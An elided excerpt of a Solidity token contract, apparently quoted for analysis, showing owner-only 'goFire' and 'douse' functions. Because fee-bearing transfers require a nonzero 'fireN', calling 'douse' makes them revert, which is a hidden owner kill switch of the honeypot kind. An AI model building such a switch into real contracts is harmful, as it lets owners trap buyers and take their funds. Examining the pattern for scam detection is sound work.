...
contract Token is IERC20, Ownable {
    ...
    uint256 public fireN;
    uint256 public fireL;
    bool private inSwap;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            require(fireN > 0);
            if (block.number <= fireN + fireL && !_swapPairList[recipient]) {
    ...
    function goFire(uint256 a) public onlyOwner {
        fireL = a;
        fireN = block.number;
    }

    function douse() public onlyOwner {
        fireN = 0;
    }
